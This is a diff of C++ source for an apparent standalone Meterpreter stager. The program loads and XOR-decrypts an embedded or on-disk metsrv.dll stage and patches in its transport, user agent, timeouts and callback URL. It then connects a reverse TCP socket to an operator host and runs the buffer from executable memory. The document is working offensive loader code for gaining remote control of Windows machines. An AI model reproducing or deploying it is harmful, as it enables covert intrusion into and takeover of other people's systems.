@@ -8,20 +8,48 @@
 - http://eldeeb.net
 - Made in Egypt :)
 ************************************************/
+/*
+Copyright (c) 2013, Sherif Eldeeb "eldeeb.net"
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met: 
+
+1. Redistributions of source code must retain the above copyright notice, this
+   list of conditions and the following disclaimer. 
+2. Redistributions in binary form must reproduce the above copyright notice,
+   this list of conditions and the following disclaimer in the documentation
+   and/or other materials provided with the distribution. 
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
+ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
+ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
+ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+The views and conclusions contained in the software and documentation are those
+of the authors and should not be interpreted as representing official policies, 
+either expressed or implied, of the FreeBSD Project.
+*/
 
 #include "main.h"
 
 int wmain(int argc, wchar_t *argv[])
 {
-	print_awesome_header();						// as it sounds...
+	print_header();								// as it sounds...
 	PAYLOAD_SETTINGS payload_settings = {0};	// That's defined at main.h
 	unsigned char* buffer = nullptr;			// This will hold the loaded stage
-	unsigned char* FinalBuffer = nullptr;		// This will have stuff set-up "like the socket" set-up, then the stage will be copied here.
+	unsigned char* TempBuffer = nullptr;		// This will have stuff set-up "like the socket" set-up, then the stage will be copied here.
 	DWORD bufferSize = 0;						// buffer length
+	DWORD StageSize = 0;						// if we're using encryption ... stage size = (bufferSize - 16) 
 	DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
 	char EncKey[17] = {0};						// XOR Encryption key
 	void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
-	BOOL IsStageEncrypted= true;				// Check if the stage is encrypted or just the plain dll ...
 	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, it will be put here. 
 
 	// Reverse_TCP specific Variables
@@ -81,45 +109,41 @@ int wmain(int argc, wchar_t *argv[])
 
 
 	//Have we been asked to load the stage from a file?
-	if(StageFilePath != NULL)
-
-	// Read resource into buffer ...
-	dprintf(L"[*] Loading resource (the stage) into memory...\n");
-	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
-	if (bufferSize == 0) // if something went wrong...
+	if(StageFilePath == L"")
 	{
-		dprintf(L"[-] Couldn't read stage from resource, please make sure that the type is \"BINARY\" and the ID is \"101\".");
-		exit(0);
+		dprintf(L"[*] Loading stage into memory from file \"%s\"\n", StageFilePath);
+		bufferSize = CopyStageToBuffer(StageFilePath, &buffer);
+	} else { // If not, We'll try to load the stage from the resource ...
+
+		// Read resource into buffer ...
+		dprintf(L"[*] Loading stage into memory from resource...\n");
+		bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
+		if (bufferSize <= 0) // if something went wrong...
+		{
+			dprintf(L"[-] Couldn't read stage from resource, please make sure that the type is \"BINARY\" and the ID is \"101\".");
+			exit(0);
+		}
 	}
-	dprintf(L"[*] Encrypted resource loaded successfully! Locating Encryption key...\n");
-	GetKeyFromBuffer(buffer, EncKey, 16);
 
-	printf("[*] \"%s\" will be used; decrypting...\n", EncKey);
-	XORcrypt(buffer, EncKey, bufferSize);
-
-	if(memcmp(&buffer[16],"MZ",2))
+	//Is the stage encrypted?
+	if(memcmp(&buffer[0],"MZ",2))
 	{
-		dprintf(L"[-] Something went wrong, bad resource, wrong encryption key, or maybe something else ... bailing out!\n");
-		exit(0);
+		dprintf(L"[!] Looks like loaded stage is encrypted, Locating Encryption key...\n");
+		GetKeyFromBuffer(buffer, EncKey, 16);
+		printf("[*] \"%s\" will be used; decrypting...\n", EncKey);
+		XORcrypt(buffer, EncKey, bufferSize);
+		if(memcmp(&buffer[16],"MZ",2))
+		{
+			dprintf(L"[-] Something went really wrong, bad resource, wrong encryption key, or maybe something else ... will exit!\n");
+			exit(0);
+		}
+		dprintf(L"[*] Looks like stage decrypted correctly, proceeding to patching stage...\n");
+		buffer = buffer + 16;
+		StageSize = bufferSize - 16;
+	} else {
+		dprintf(L"[*] Looks like loaded stage is a regular DLL, proceeding to patching stage..\n");
+		StageSize = bufferSize;
 	}
-	dprintf(L"[*] Looks like resource decrypted correctly, proceeding ...\n");
-
-
-	/*
-	if(argc == 1)
-	{
-	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
-	GetKeyFromBuffer(buffer, EncKey, 16);
-	XORcrypt(buffer, EncKey, bufferSize);
-	buffer = buffer + 11; // 16 bytes encryption key - 5 bytes for (0xBF + Socket number)
-	}
-	else
-	{ 
-	wchar_t filename[MAX_PATH] = {0};
-	wcscpy_s(filename,argv[1]);
-	bufferSize = CopyStageToBuffer(filename, &buffer);
-	}
-	*/
 
 	/////////////////////////////////////////
 	/****************************************
@@ -128,7 +152,7 @@ int wmain(int argc, wchar_t *argv[])
 	/////////////////////////////////////////
 
 	// Patching transport 
-	index = binstrstr(buffer, (int)bufferSize, (unsigned char*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
+	index = binstrstr(buffer, (int)StageSize, (unsigned char*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
 	if (index == 0) // if the transport is not found ...
 	{
 		dprintf(L"[-] Couldn't locate transport string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -138,15 +162,9 @@ int wmain(int argc, wchar_t *argv[])
 	PatchString(buffer, payload_settings.TRANSPORT, index, wcslen(payload_settings.TRANSPORT));
 
 	// Patching ReflectiveDLL bootstrap 
-	index = 0; //rewind.
-	index = binstrstr(buffer, (int)bufferSize, (unsigned char*)"MZ", (int)strlen("MZ"));
-	if (index == 0) // if "MZ" not found ...
-	{
-		dprintf(L"[-] Couldn't locate \"MZ\", this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
-		exit(0);
-	}
+	index = 0;  //rewind
 	dprintf(L"[*] Patching ReflectiveDll Bootstrap: \"MZ\" Offset 0x%08x\n", index);	
-	memcpy(buffer+index, ReflectiveDllBootLoader, 62);//dos header can't exceed 62
+	memcpy(buffer, ReflectiveDllBootLoader, 62);//dos header
 
 	//////////////////////////////////////////
 	//  Stuff needed for HTTP/HTTPS only!!  //
@@ -156,7 +174,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching UserAgent
 		index = 0; //rewind.
-		index = binstrstr(buffer, (int)bufferSize, (unsigned char*)global_meterpreter_ua, (int)strlen(global_meterpreter_ua));
+		index = binstrstr(buffer, (int)StageSize, (unsigned char*)global_meterpreter_ua, (int)strlen(global_meterpreter_ua));
 		if (index == 0) // if the UA is not found ...
 		{
 			dprintf(L"[-] Couldn't locate UA string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -172,7 +190,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching global expiration timeout.
 		index = 0; //rewind
-		index = binstrstr(buffer, (int)bufferSize, (unsigned char*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; little endian, metsrv.dll 
+		index = binstrstr(buffer, (int)StageSize, (unsigned char*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; little endian, metsrv.dll 
 		if (index == 0) // if the global_expiration_timeout is not found ...
 		{
 			dprintf(L"[-] Couldn't locate global_expiration_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -189,7 +207,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		//Patching global_comm_timeout.
 		index = 0; //rewind
-		index = binstrstr(buffer, (int)bufferSize, (unsigned char*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; little endian, metsrv.dll 
+		index = binstrstr(buffer, (int)StageSize, (unsigned char*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; little endian, metsrv.dll 
 		if (index == 0) // if the global_expiration_timeout is not found ...
 		{
 			dprintf(L"[-] Couldn't locate global_comm_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
@@ -211,22 +229,25 @@ int wmain(int argc, wchar_t *argv[])
 	// Are we reverse_tcp?
 	if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
 	{
-		//Adjusting buffer .. this is important!
-		//We have the first 16 bytes as \0s, we have to skip them and leave only 5 bytes for the 0xBF + 4 bytes of socket 
-		buffer = buffer + 11; // (16 bytes encryption key) - (5 bytes for (0xBF + Socket number))
+		// Adjusting buffer .. this is important!
+		// REVERSE_TCP has extra requirements ... the stage needs to be preceeded with `0xBF + 4 bytes of a valid socket connected to the handler` 
+		// My approach to acheive this: We'll first VirtualAlloc size + 5 bytes to another buffer "TempBuffer", skip 5 bytes, then copy the contents 
+		// of "buffer" over, then point buffer to that new TempBuffer ... then take it from there.
+		TempBuffer = (unsigned char*)VirtualAlloc(0, StageSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		memcpy(TempBuffer + 5, buffer, StageSize);		//making room for 5 bytes ...
+		buffer = TempBuffer;							//Got it? I'm sure there's a better way to do that :).
+		//////////////////////////////////////////////////
 
 		ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
 		if (ConnectSocket == INVALID_SOCKET)
 		{
-			dprintf(L"[-] Failed to connect...\n");
+			dprintf(L"[-] Failed to connect ... will exit!\n");
 			exit(0);
 		}
 		dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
 		buffer[0] = 0xBF;
 		dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
 		memcpy(buffer+1, &ConnectSocket, 4);
-
-
 	} 
 
 	// Are we reverse_http(s)?
@@ -278,7 +299,7 @@ int wmain(int argc, wchar_t *argv[])
 
 		wchar_t temp[512] = {0};
 		mbstowcs_s(NULL,temp,url,strlen(url));
-		dprintf(L"[*] URL: %s\n",temp);
+		dprintf(L"[*] Calculated URL: %s\n",temp);
 
 		//Patching URL ...
 		index = 0; //Rewind
@@ -290,19 +311,13 @@ int wmain(int argc, wchar_t *argv[])
 		}
 		dprintf(L"[*] Patching global_meterpreter_url: Offset 0x%08x ->  \"%s\"\n", index, temp );
 		memcpy(&buffer[index], &url, strlen(url)+1); //+1 to make sure it'll be null terminated, otherwise it will end with 'X'
-
-		//Adjusting buffer .. this is important!
-		//We have the first 16 bytes as \0s, we have to skip them and set the buffer to start at MZ.
-		//No socket, no 0xBF here ... reverse_http & reverse_https do not require socket
-		dprintf(L"[*] Adjusting buffer...\n\n");
-		buffer = buffer + 16; 
 	}
+
 	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
 	function = (void (*)())buffer;
 
-
 	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
-	FreeConsole();
+	//FreeConsole();
 	function();
 
 	return 0;
